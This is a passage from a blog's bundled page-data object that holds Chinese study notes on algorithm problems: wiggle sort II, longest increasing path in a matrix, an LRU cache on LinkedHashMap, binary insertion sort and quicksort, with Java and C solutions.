II",date:"2022-04-17T17:48:54.000Z",permalink:"/pages/620bd9/",categories:["leetcode"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/01.%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/01.leetcode/324.%20%E6%91%86%E5%8A%A8%E6%8E%92%E5%BA%8F%20II.html",relativePath:"01.数据结构与算法/01.leetcode/324. 摆动排序 II.md",key:"v-53730a12",path:"/pages/620bd9/",headers:[{level:2,title:"题目",slug:"题目",normalizedTitle:"题目",charIndex:72},{level:2,title:"思路",slug:"思路",normalizedTitle:"思路",charIndex:376}],headersStr:"题目 思路",content:"给你一个整数数组 nums，将它重新排列成 nums[0] < nums[1] > nums[2] < nums[3]... 的顺序。\n\n\n# 题目\n\n你可以假设所有输入数组都可以得到满足题目要求的结果。\n\n示例 1：\n\n输入：nums = [1,5,1,1,6,4] 输出：[1,6,1,5,1,4] 解释：[1,4,1,5,1,6] 同样是符合题目要求的结果，可以被判题程序接受。 示例 2：\n\n输入：nums = [1,3,2,2,3,1] 输出：[2,3,1,3,1,2]\n\n提示：\n\n1 <= nums.length <= 5 * 104 0 <= nums[i] <= 5000 题目数据保证，对于给定的输入 nums ，总能产生满足题目要求的结果\n\n进阶：你能用 O(n) 时间复杂度和 / 或原地 O(1) 额外空间来实现吗？\n\n\n# 思路\n\n先排序 然后从中间拆成两份 再交叉 比如 先排序完成之后结果为 1 2 3 4 5 然后就可以拆成1 2 3和4 5 穿插之后就是1 4 2 5 3 但这种方法 有一点很没有必要 就是排序 只需要 根据中位数 拆成左右两部分 2 1 3 5 4 依然可以拆成 2 1 3和5 4，然后交叉陈2 5 1 4 3 而此时可以使用快速选择法 快速选择(Quickselect)算法：寻找第k大的元素\n\n注：拆分成两份之后，一定要将两部分反向\n\n> 例如，对于数组[1,1,2,2,3,3],分割为[1,1,2]和[2,3,3]，虽然A和B都出现了2，但穿插后为[1,2,1,3,2,3]，满足要求。 而如果2的个数再多一些，即[1,1,2,2,2,3]，分割为[1,1,2]和[2,2,3]，最终结果为[1,2,1,2,2,3]，来自A的2和来自B的2出现在了相邻位置。\n> \n> 出现这一问题是因为重复数在A和B中的位置决定的，因为r在A尾部，B头部，所以如果r个数太多（大于等于(length(nums) + 1)/2），就可能在穿插后相邻。要解决这一问题，我们需要使A的r和B的r在穿插后尽可能分开。一种可行的办法是将A和B反序：\n> \n> 例如，对于数组[1,1,2,2,2,3]，分割为[1,1,2]和[2,2,3]，分别反序后得到[2, 1, 1]和[3, 2, 2]，此时2在A头部，B尾部，穿插后就不会发生相邻了。\n> \n> 当然，这只能解决r的个数等于(length(nums) + 1)/2的情况，如果r的个数大于(length(nums) + 1)/2，还是会出现相邻。但实际上，这种情况是不存在有效解的，也就是说，这种数组对于本题来说是非法的",normalizedContent:"给你一个整数数组 nums，将它重新排列成 nums[0] < nums[1] > nums[2] < nums[3]... 的顺序。\n\n\n# 题目\n\n你可以假设所有输入数组都可以得到满足题目要求的结果。\n\n示例 1：\n\n输入：nums = [1,5,1,1,6,4] 输出：[1,6,1,5,1,4] 解释：[1,4,1,5,1,6] 同样是符合题目要求的结果，可以被判题程序接受。 示例 2：\n\n输入：nums = [1,3,2,2,3,1] 输出：[2,3,1,3,1,2]\n\n提示：\n\n1 <= nums.length <= 5 * 104 0 <= nums[i] <= 5000 题目数据保证，对于给定的输入 nums ，总能产生满足题目要求的结果\n\n进阶：你能用 o(n) 时间复杂度和 / 或原地 o(1) 额外空间来实现吗？\n\n\n# 思路\n\n先排序 然后从中间拆成两份 再交叉 比如 先排序完成之后结果为 1 2 3 4 5 然后就可以拆成1 2 3和4 5 穿插之后就是1 4 2 5 3 但这种方法 有一点很没有必要 就是排序 只需要 根据中位数 拆成左右两部分 2 1 3 5 4 依然可以拆成 2 1 3和5 4，然后交叉陈2 5 1 4 3 而此时可以使用快速选择法 快速选择(quickselect)算法：寻找第k大的元素\n\n注：拆分成两份之后，一定要将两部分反向\n\n> 例如，对于数组[1,1,2,2,3,3],分割为[1,1,2]和[2,3,3]，虽然a和b都出现了2，但穿插后为[1,2,1,3,2,3]，满足要求。 而如果2的个数再多一些，即[1,1,2,2,2,3]，分割为[1,1,2]和[2,2,3]，最终结果为[1,2,1,2,2,3]，来自a的2和来自b的2出现在了相邻位置。\n> \n> 出现这一问题是因为重复数在a和b中的位置决定的，因为r在a尾部，b头部，所以如果r个数太多（大于等于(length(nums) + 1)/2），就可能在穿插后相邻。要解决这一问题，我们需要使a的r和b的r在穿插后尽可能分开。一种可行的办法是将a和b反序：\n> \n> 例如，对于数组[1,1,2,2,2,3]，分割为[1,1,2]和[2,2,3]，分别反序后得到[2, 1, 1]和[3, 2, 2]，此时2在a头部，b尾部，穿插后就不会发生相邻了。\n> \n> 当然，这只能解决r的个数等于(length(nums) + 1)/2的情况，如果r的个数大于(length(nums) + 1)/2，还是会出现相邻。但实际上，这种情况是不存在有效解的，也就是说，这种数组对于本题来说是非法的",charsets:{cjk:!0},lastUpdated:"2022/04/18, 00:47:23",lastUpdatedTimestamp:1650214043e3},{title:"矩阵中的最长递增路径",frontmatter:{title:"矩阵中的最长递增路径",date:"2022-04-17T17:48:54.000Z",permalink:"/pages/936e38/",categories:["leetcode"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/01.%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/01.leetcode/329.%20%E7%9F%A9%E9%98%B5%E4%B8%AD%E7%9A%84%E6%9C%80%E9%95%BF%E9%80%92%E5%A2%9E%E8%B7%AF%E5%BE%84.html",relativePath:"01.数据结构与算法/01.leetcode/329. 矩阵中的最长递增路径.md",key:"v-02dc103a",path:"/pages/936e38/",headers:[{level:2,title:"1. 题目",slug:"_1-题目",normalizedTitle:"1. 题目",charIndex:2},{level:2,title:"2. 思路",slug:"_2-思路",normalizedTitle:"2. 思路",charIndex:509},{level:2,title:"3. 代码",slug:"_3-代码",normalizedTitle:"3. 代码",charIndex:687},{level:2,title:"3.1 方法1 ：记忆化搜索:",slug:"_3-1-方法1-记忆化搜索",normalizedTitle:"3.1 方法1 ：记忆化搜索:",charIndex:771},{level:2,title:"3.2 方法2：动态规划",slug:"_3-2-方法2-动态规划",normalizedTitle:"3.2 方法2：动态规划",charIndex:1828}],headersStr:"1. 题目 2. 思路 3. 代码 3.1 方法1 ：记忆化搜索: 3.2 方法2：动态规划",content:"# 1. 题目\n\n给定一个 m x n 整数矩阵 matrix ，找出其中 最长递增路径 的长度。\n\n对于每个单元格，你可以往上，下，左，右四个方向移动。 你 不能 在 对角线 方向上移动或移动到 边界外（即不允许环绕）。\n\n示例 1：\n\n\n\n输入：matrix = [[9,9,4],[6,6,8],[2,1,1]]\n输出：4 \n解释：最长递增路径为 `[1, 2, 6, 9]`。\n\n\n1\n2\n3\n\n\n示例 2：\n\n\n\n输入：matrix = [[3,4,5],[3,2,6],[2,2,1]]\n输出：4 \n解释：最长递增路径是 `[3, 4, 5, 6]`。注意不允许在对角线方向上移动。\n\n\n\n1\n2\n3\n4\n\n\n示例 3：\n\n输入：matrix = [[1]]\n输出：1\n\n\n\n1\n2\n3\n\n\n提示：\n\n * m == matrix.length\n * n == matrix[i].length\n * 1 <= m, n <= 200\n * 0 <= matrix[i][j] <= 2<sup>31</sup> - 1\n\n相关标签 深度优先搜索 广度优先搜索 图 拓扑排序 记忆化搜索 动态规划\n\n\n# 2. 思路\n\n这道题有两种方式\n\n * 深度优先搜索（记忆化搜索的办法）\n * 宽度优先搜索（动态规划的方法）\n\n动态规划的方程其实好写出来，初始值也好确定，但是对于遍历顺序反而很难想，不能行列for循环\n\n其次递归或者遍历的时候 结果的定义是要确定好 要么是以某个点为起点，此时的最长递增路径 或者以某个点为终点的最长递增路径\n\n参考：官方解答\n\n\n# 3. 代码\n\n我这里的代码是根据结点的入度来写的 官方的是根据结点的出度来写的 从运行结果来看貌似记忆化搜索的速度更快，差不多有3倍的差距，虽然时间复杂度相同\n\n\n# 3.1 方法1 ：记忆化搜索:\n\npublic int longestIncreasingPath(int[][] matrix) {\n    int result = 0;\n    int[][] increasePath = new int[matrix.length][matrix[0].length];\n    for (int i = 0; i < matrix.length; i++) {\n        for (int j = 0; j < matrix[0].length; j++) {\n            result = Math.max(result , dfs(matrix,increasePath,i,j));\n        }\n    }\n    return result;\n}\n\nprivate int dfs(int[][] matrix, int[][] increasePath, int i, int j) {\n    if(increasePath[i][j]!=0) return increasePath[i][j];\n    int up=0, down=0 ,left=0 ,right =0;\n    if(i>0&&matrix[i-1][j]<matrix[i][j]) up = dfs(matrix,increasePath,i-1,j);\n    if(j>0&&matrix[i][j-1]<matrix[i][j]) left = dfs(matrix,increasePath,i,j-1);\n    if(i+1< matrix.length && matrix[i+1][j]<matrix[i][j]) down = dfs(matrix,increasePath,i+1,j);\n    if(j+1<matrix[0].length && matrix[i][j+1]<matrix[i][j]) right = dfs(matrix,increasePath,i,j+1);\n    increasePath[i][j] = 1+Math.max(Math.max(up,left),Math.max(down,right));\n    return increasePath[i][j];\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n\n# 3.2 方法2：动态规划\n\npublic int longestIncreasingPath1(int[][] matrix) {\n    int[][] inDegree = new int[matrix.length][matrix[0].length];\n    Queue<int[]> queue = new LinkedList<>();\n    for (int i = 0; i < matrix.length; i++) {\n        for (int j = 0; j < matrix[0].length; j++) {\n            if(i>0&&matrix[i-1][j]<matrix[i][j]) inDegree[i][j]++;\n            if(j>0&&matrix[i][j-1]<matrix[i][j]) inDegree[i][j]++;\n            if(i+1< matrix.length && matrix[i+1][j]<matrix[i][j]) inDegree[i][j]++;\n            if(j+1<matrix[0].length && matrix[i][j+1]<matrix[i][j]) inDegree[i][j]++;\n            if(inDegree[i][j]==0) queue.add(new int[]{i,j});\n        }\n    }\n    int result =0;\n    while (!queue.isEmpty()){\n        result++;\n        int size = queue.size();\n        for (int k = 0; k < size; k++) {\n            int[] poll = queue.poll();\n            int i = poll[0],j = poll[1];\n            if(i>0&&matrix[i-1][j]>matrix[i][j]) {\n                inDegree[i-1][j]--;\n                if(inDegree[i-1][j]==0){\n                    queue.add(new int[]{i-1,j});\n                }\n            }\n            if(j>0&&matrix[i][j-1]>matrix[i][j]) {\n                inDegree[i][j-1]--;\n                if(inDegree[i][j-1]==0){\n                    queue.add(new int[]{i,j-1});\n                }\n            }\n            if(i+1< matrix.length && matrix[i+1][j]>matrix[i][j]) {\n                inDegree[i+1][j]--;\n                if(inDegree[i+1][j]==0){\n                    queue.add(new int[]{i+1,j});\n                }\n            }\n            if(j+1<matrix[0].length && matrix[i][j+1]>matrix[i][j]) {\n                inDegree[i][j+1]--;\n                if(inDegree[i][j+1]==0){\n                    queue.add(new int[]{i,j+1});\n                }\n            }\n        }\n\n    }\n    return result;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n",normalizedContent:"# 1. 题目\n\n给定一个 m x n 整数矩阵 matrix ，找出其中 最长递增路径 的长度。\n\n对于每个单元格，你可以往上，下，左，右四个方向移动。 你 不能 在 对角线 方向上移动或移动到 边界外（即不允许环绕）。\n\n示例 1：\n\n\n\n输入：matrix = [[9,9,4],[6,6,8],[2,1,1]]\n输出：4 \n解释：最长递增路径为 `[1, 2, 6, 9]`。\n\n\n1\n2\n3\n\n\n示例 2：\n\n\n\n输入：matrix = [[3,4,5],[3,2,6],[2,2,1]]\n输出：4 \n解释：最长递增路径是 `[3, 4, 5, 6]`。注意不允许在对角线方向上移动。\n\n\n\n1\n2\n3\n4\n\n\n示例 3：\n\n输入：matrix = [[1]]\n输出：1\n\n\n\n1\n2\n3\n\n\n提示：\n\n * m == matrix.length\n * n == matrix[i].length\n * 1 <= m, n <= 200\n * 0 <= matrix[i][j] <= 2<sup>31</sup> - 1\n\n相关标签 深度优先搜索 广度优先搜索 图 拓扑排序 记忆化搜索 动态规划\n\n\n# 2. 思路\n\n这道题有两种方式\n\n * 深度优先搜索（记忆化搜索的办法）\n * 宽度优先搜索（动态规划的方法）\n\n动态规划的方程其实好写出来，初始值也好确定，但是对于遍历顺序反而很难想，不能行列for循环\n\n其次递归或者遍历的时候 结果的定义是要确定好 要么是以某个点为起点，此时的最长递增路径 或者以某个点为终点的最长递增路径\n\n参考：官方解答\n\n\n# 3. 代码\n\n我这里的代码是根据结点的入度来写的 官方的是根据结点的出度来写的 从运行结果来看貌似记忆化搜索的速度更快，差不多有3倍的差距，虽然时间复杂度相同\n\n\n# 3.1 方法1 ：记忆化搜索:\n\npublic int longestincreasingpath(int[][] matrix) {\n    int result = 0;\n    int[][] increasepath = new int[matrix.length][matrix[0].length];\n    for (int i = 0; i < matrix.length; i++) {\n        for (int j = 0; j < matrix[0].length; j++) {\n            result = math.max(result , dfs(matrix,increasepath,i,j));\n        }\n    }\n    return result;\n}\n\nprivate int dfs(int[][] matrix, int[][] increasepath, int i, int j) {\n    if(increasepath[i][j]!=0) return increasepath[i][j];\n    int up=0, down=0 ,left=0 ,right =0;\n    if(i>0&&matrix[i-1][j]<matrix[i][j]) up = dfs(matrix,increasepath,i-1,j);\n    if(j>0&&matrix[i][j-1]<matrix[i][j]) left = dfs(matrix,increasepath,i,j-1);\n    if(i+1< matrix.length && matrix[i+1][j]<matrix[i][j]) down = dfs(matrix,increasepath,i+1,j);\n    if(j+1<matrix[0].length && matrix[i][j+1]<matrix[i][j]) right = dfs(matrix,increasepath,i,j+1);\n    increasepath[i][j] = 1+math.max(math.max(up,left),math.max(down,right));\n    return increasepath[i][j];\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n\n# 3.2 方法2：动态规划\n\npublic int longestincreasingpath1(int[][] matrix) {\n    int[][] indegree = new int[matrix.length][matrix[0].length];\n    queue<int[]> queue = new linkedlist<>();\n    for (int i = 0; i < matrix.length; i++) {\n        for (int j = 0; j < matrix[0].length; j++) {\n            if(i>0&&matrix[i-1][j]<matrix[i][j]) indegree[i][j]++;\n            if(j>0&&matrix[i][j-1]<matrix[i][j]) indegree[i][j]++;\n            if(i+1< matrix.length && matrix[i+1][j]<matrix[i][j]) indegree[i][j]++;\n            if(j+1<matrix[0].length && matrix[i][j+1]<matrix[i][j]) indegree[i][j]++;\n            if(indegree[i][j]==0) queue.add(new int[]{i,j});\n        }\n    }\n    int result =0;\n    while (!queue.isempty()){\n        result++;\n        int size = queue.size();\n        for (int k = 0; k < size; k++) {\n            int[] poll = queue.poll();\n            int i = poll[0],j = poll[1];\n            if(i>0&&matrix[i-1][j]>matrix[i][j]) {\n                indegree[i-1][j]--;\n                if(indegree[i-1][j]==0){\n                    queue.add(new int[]{i-1,j});\n                }\n            }\n            if(j>0&&matrix[i][j-1]>matrix[i][j]) {\n                indegree[i][j-1]--;\n                if(indegree[i][j-1]==0){\n                    queue.add(new int[]{i,j-1});\n                }\n            }\n            if(i+1< matrix.length && matrix[i+1][j]>matrix[i][j]) {\n                indegree[i+1][j]--;\n                if(indegree[i+1][j]==0){\n                    queue.add(new int[]{i+1,j});\n                }\n            }\n            if(j+1<matrix[0].length && matrix[i][j+1]>matrix[i][j]) {\n                indegree[i][j+1]--;\n                if(indegree[i][j+1]==0){\n                    queue.add(new int[]{i,j+1});\n                }\n            }\n        }\n\n    }\n    return result;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n",charsets:{cjk:!0},lastUpdated:"2022/04/18, 00:47:23",lastUpdatedTimestamp:1650214043e3},{title:"NC93 设计LRU缓存结构",frontmatter:{title:"NC93 设计LRU缓存结构",date:"2022-04-17T23:57:04.000Z",permalink:"/pages/b79555/",categories:["数据结构与算法","牛客网"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/01.%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/02.%E7%89%9B%E5%AE%A2%E7%BD%91/93.NC93%20%E8%AE%BE%E8%AE%A1LRU%E7%BC%93%E5%AD%98%E7%BB%93%E6%9E%84.html",relativePath:"01.数据结构与算法/02.牛客网/93.NC93 设计LRU缓存结构.md",key:"v-f423a396",path:"/pages/b79555/",headers:[{level:2,title:"描述",slug:"描述",normalizedTitle:"描述",charIndex:9},{level:2,title:"提示:",slug:"提示",normalizedTitle:"提示:",charIndex:333}],headersStr:"描述 提示:",content:'# 题目\n\n\n# 描述\n\n设计LRU(最近最少使用)缓存结构，该结构在构造时确定大小，假设大小为 capacity ，操作次数是 n ，并有如下功能:\n\n 1. Solution(int capacity) 以正整数作为容量 capacity 初始化 LRU 缓存\n 2. get(key)：如果关键字 key 存在于缓存中，则返回key对应的value值，否则返回 -1 。\n 3. set(key, value)：将记录(key, value)插入该结构，如果关键字 key 已经存在，则变更其数据值 value，如果不存在，则向缓存中插入该组 key-value ，如果key-value的数量超过capacity，弹出最久未使用的key-value\n\n\n# 提示:\n\n1.某个key的set或get操作一旦发生，则认为这个key的记录成了最常使用的，然后都会刷新缓存。 2.当缓存的大小超过capacity时，移除最不经常使用的记录。 3.返回的value都以字符串形式表达，如果是set，则会输出"null"来表示(不需要用户返回，系统会自动输出)，方便观察 4.函数set和get必须以O(1)的方式运行 5.为了方便区分缓存里key与value，下面说明的缓存里key用""号包裹 $1≤capacity<=10^5$ $0≤key,val≤2×10^9$ $1≤n≤10^5$\n\n\n# 思路\n\n直接使用LinksedHashMap来实现 传入参数true来使得是根据访问顺序来排序而不是插入顺序 重写删除方法\n\nprotected boolean removeEldestEntry(Map.Entry eldest)\n\n\n1\n\n\n来实现满了就删除最久未访问的对象\n\n\n# 代码\n\npublic class Solution {\n    private LinkedHashMap<Integer,Integer> linkedHashMap = null;\n\n    public Solution(int capacity) {\n        // write code here\n        linkedHashMap = new LinkedHashMap(capacity,0.75f,true){\n            @Override\n            protected boolean removeEldestEntry(Map.Entry eldest) {\n                return this.size()>capacity;\n            }\n        };\n    }\n\n    public int get(int key) {\n        // write code here\n        if(linkedHashMap.containsKey(key)){\n            return linkedHashMap.get(key);\n        }else {\n            return -1;\n        }\n    }\n\n    public void set(int key, int value) {\n        // write code here\n        linkedHashMap.put(key,value);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n',normalizedContent:'# 题目\n\n\n# 描述\n\n设计lru(最近最少使用)缓存结构，该结构在构造时确定大小，假设大小为 capacity ，操作次数是 n ，并有如下功能:\n\n 1. solution(int capacity) 以正整数作为容量 capacity 初始化 lru 缓存\n 2. get(key)：如果关键字 key 存在于缓存中，则返回key对应的value值，否则返回 -1 。\n 3. set(key, value)：将记录(key, value)插入该结构，如果关键字 key 已经存在，则变更其数据值 value，如果不存在，则向缓存中插入该组 key-value ，如果key-value的数量超过capacity，弹出最久未使用的key-value\n\n\n# 提示:\n\n1.某个key的set或get操作一旦发生，则认为这个key的记录成了最常使用的，然后都会刷新缓存。 2.当缓存的大小超过capacity时，移除最不经常使用的记录。 3.返回的value都以字符串形式表达，如果是set，则会输出"null"来表示(不需要用户返回，系统会自动输出)，方便观察 4.函数set和get必须以o(1)的方式运行 5.为了方便区分缓存里key与value，下面说明的缓存里key用""号包裹 $1≤capacity<=10^5$ $0≤key,val≤2×10^9$ $1≤n≤10^5$\n\n\n# 思路\n\n直接使用linksedhashmap来实现 传入参数true来使得是根据访问顺序来排序而不是插入顺序 重写删除方法\n\nprotected boolean removeeldestentry(map.entry eldest)\n\n\n1\n\n\n来实现满了就删除最久未访问的对象\n\n\n# 代码\n\npublic class solution {\n    private linkedhashmap<integer,integer> linkedhashmap = null;\n\n    public solution(int capacity) {\n        // write code here\n        linkedhashmap = new linkedhashmap(capacity,0.75f,true){\n            @override\n            protected boolean removeeldestentry(map.entry eldest) {\n                return this.size()>capacity;\n            }\n        };\n    }\n\n    public int get(int key) {\n        // write code here\n        if(linkedhashmap.containskey(key)){\n            return linkedhashmap.get(key);\n        }else {\n            return -1;\n        }\n    }\n\n    public void set(int key, int value) {\n        // write code here\n        linkedhashmap.put(key,value);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n',charsets:{cjk:!0},lastUpdated:"2022/04/18, 00:47:23",lastUpdatedTimestamp:1650214043e3},{title:"二分插入排序实现",frontmatter:{title:"二分插入排序实现",date:"2022-04-18T00:00:19.000Z",permalink:"/pages/a90be1/",categories:["数据结构与算法","排序"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/01.%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/03.%E6%8E%92%E5%BA%8F/02.%E4%BA%8C%E5%88%86%E6%8F%92%E5%85%A5%E6%8E%92%E5%BA%8F%E5%AE%9E%E7%8E%B0.html",relativePath:"01.数据结构与算法/03.排序/02.二分插入排序实现.md",key:"v-66322c34",path:"/pages/a90be1/",headersStr:null,content:'在编写二分插入排序代码的时候发现，写二分查找的代码的时候，只用考虑是否存在这个元素，不存在则查找失败。而排序的时候可能会出现该插入的位置在中间位置的附近，而不能很好的确定位置 所以把代码记录如下\n\n/*\n二分插入排序算法（升序）\n */\n#include<stdio.h>\n#include<stdlib.h>\n\nvoid binSort(int *a,int len);\nvoid binSort(int *a,int len)\n{\n    int mid,left,right,temp;\n    for(int i=1;i<len;i++)\n    {\n        left = 0;//初始化已拍好序的左边界为0\n        right = i-1;//右边界为待排序元素的前一个位置\n        temp = a[i];//待排序元素\n        while(left<=right)\n        {\n            mid = (left+right)/2;//计算中间位置\n            if(temp<a[mid])\n            {\n                right = mid-1;//如果比中间位置小则缩小右边的范围为mid-1\n            }\n            else\n            {\n                left = mid+1;//如果比中间位置大则扩大右边的范围为mid+1，\n            }\n        }\n        for(int j=i-1;j>=left;j--)\n        {\n            a[j+1] = a[j];//将大于等于左边界值的元素全部后移\n        }\n        if(left!=i)\n        {\n            a[left] = temp;//待插入元素插入位置不等于现在所处位置时，则插入空处\n        }\n    }\n}\n\nint main()\n{\n    int a[]={49,38,65,97,76,13,27,49};//待排序数组\n    int len = sizeof(a)/(sizeof(a[0]));\n    binSort(a,len);\n    for(int i=0;i<len;i++)\n    {\n        printf("%d ", a[i]);\n    }\n    printf("\\n");\n    return 0;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n',normalizedContent:'在编写二分插入排序代码的时候发现，写二分查找的代码的时候，只用考虑是否存在这个元素，不存在则查找失败。而排序的时候可能会出现该插入的位置在中间位置的附近，而不能很好的确定位置 所以把代码记录如下\n\n/*\n二分插入排序算法（升序）\n */\n#include<stdio.h>\n#include<stdlib.h>\n\nvoid binsort(int *a,int len);\nvoid binsort(int *a,int len)\n{\n    int mid,left,right,temp;\n    for(int i=1;i<len;i++)\n    {\n        left = 0;//初始化已拍好序的左边界为0\n        right = i-1;//右边界为待排序元素的前一个位置\n        temp = a[i];//待排序元素\n        while(left<=right)\n        {\n            mid = (left+right)/2;//计算中间位置\n            if(temp<a[mid])\n            {\n                right = mid-1;//如果比中间位置小则缩小右边的范围为mid-1\n            }\n            else\n            {\n                left = mid+1;//如果比中间位置大则扩大右边的范围为mid+1，\n            }\n        }\n        for(int j=i-1;j>=left;j--)\n        {\n            a[j+1] = a[j];//将大于等于左边界值的元素全部后移\n        }\n        if(left!=i)\n        {\n            a[left] = temp;//待插入元素插入位置不等于现在所处位置时，则插入空处\n        }\n    }\n}\n\nint main()\n{\n    int a[]={49,38,65,97,76,13,27,49};//待排序数组\n    int len = sizeof(a)/(sizeof(a[0]));\n    binsort(a,len);\n    for(int i=0;i<len;i++)\n    {\n        printf("%d ", a[i]);\n    }\n    printf("\\n");\n    return 0;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n',charsets:{cjk:!0},lastUpdated:"2022/04/18, 00:47:23",lastUpdatedTimestamp:1650214043e3},{title:"快速排序代码实现（简单版）",frontmatter:{title:"快速排序代码实现（简单版）",date:"2022-04-18T00:00:19.000Z",permalink:"/pages/9941e6/",categories:["数据结构与算法","排序"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/01.%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/03.%E6%8E%92%E5%BA%8F/03.%E5%BF%AB%E9%80%9F%E6%8E%92%E5%BA%8F%E4%BB%A3%E7%A0%81%E5%AE%9E%E7%8E%B0%EF%BC%88%E7%AE%80%E5%8D%95%E7%89%88%EF%BC%89.html",relativePath:"01.数据结构与算法/03.排序/03.快速排序代码实现（简单版）.md",key:"v-29d4d5af",path:"/pages/9941e6/",headersStr:null,content:"int partition(int a[], int low, int high)\n{\n    int x = a[low];    //将该数组第一个元素设置为比较元素\n    int i = low;    //指向数组头的指针，**这个地方不能设置成low+1**\n    int j = high;    //指向数组尾的指针\n    while (i < j)\n    {\n        while (i < j && a[j] >= x)\n            j--;    //从右至左找到第一个小于比较元素的数\n        while (i < j && a[i] <= x)\n            i++;    //从左至右找到第一个大于比较元素的数\n        /*需要注意的是，这里的j--与i++的顺序不可以调换！\n          如果调换了顺序，i会走过头，以至于将后面较大的元素交换到数组开头*/\n\n        //将大数与小数交换\n        if (i != j)\n            swap(a[i], a[j]);\n    }\n    swap(a[low], a[i]);    //将比较元素交换到期望位置\n    return i;    //返回比较元素的位置\n}\n\nvoid quicksort(int a[], int low, int high)\n{\n    if (low < high)\n    {\n        int i = partition(a, low, high);    //划分数组并获取比较元素的位置\n        quicksort(a, low, i - 1);    //对比较元素左边进行排序\n        quicksort(a, i + 1, high);    //对比较元素右边进行排序\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n",normalizedContent:"int partition(int a[], int low, int high)\n{\n    int x = a[low];    //将该数组第一个元素设置为比较元素\n    int i = low;    //指向数组头的指针，**这个地方不能设置成low+1**\n    int j = high;    //指向数组尾的指针\n    while (i < j)\n    {\n        while (i < j && a[j] >= x)\n            j--;    //从右至左找到第一个小于比较元素的数\n        while (i < j && a[i] <= x)\n            i++;    //从左至右找到第一个大于比较元素的数\n        /*需要注意的是，这里的j--与i++的顺序不可以调换！\n          如果调换了顺序，i会走过头，以至于将后面较大的元素交换到数组开头*/\n\n        //将大数与小数交换\n        if (i != j)\n            swap(a[i], a[j]);\n    }\n    swap(a[low], a[i]);    //将比较元素交换到期望位置\n    return i;    //返回比较元素的位置\n}\n\nvoid quicksort(int a[], int low, int high)\n{\n    if (low < high)\n    {\n        int i = partition(a, low, high);    //划分数组并获取比较元素的位置\n        quicksort(a, low, i - 1);    //对比较元素左边进行排序\n        quicksort(a, i + 1, high);    //对比较元素右边进行排序\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n",charsets:{cjk:!0},lastUpdated:"2022/04/18, 00:47:23",lastUpdatedTimestamp:1650214043e3},{title:"快速排序算法",frontmatter:{title:"快速排序算法",date:"2022-04-18T00:00:19.000Z",permalink:"/pages/fc2f07/",categories:["数据结构与算法","排序"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/01.%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/03.%E6%8E%92%E5%BA%8F/04.%E5%BF%AB%E9%80%9F%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95.html",relativePath:"01.数据结构与算法/03.排序/04.快速排序算法.md",key:"v-1d49c3c4",path:"/pages/fc2f07/",headersStr:null,content:'最开始学习编程，遇到排序问题，一般都是用冒泡法，因为冒泡法好理解，代码量少。但是这种算法时间复杂度高，当需要排序的元素较多时，程序运行时间很长，因此产生了快速排序算法。该算法的实现可分为以下几步：\n\n 1. 在数组中选一个基准数（通常为数组第一个）；\n\n 2. 将数组中小于基准数的数据移到基准数左边，大于基准数的移到右边；\n\n 3. 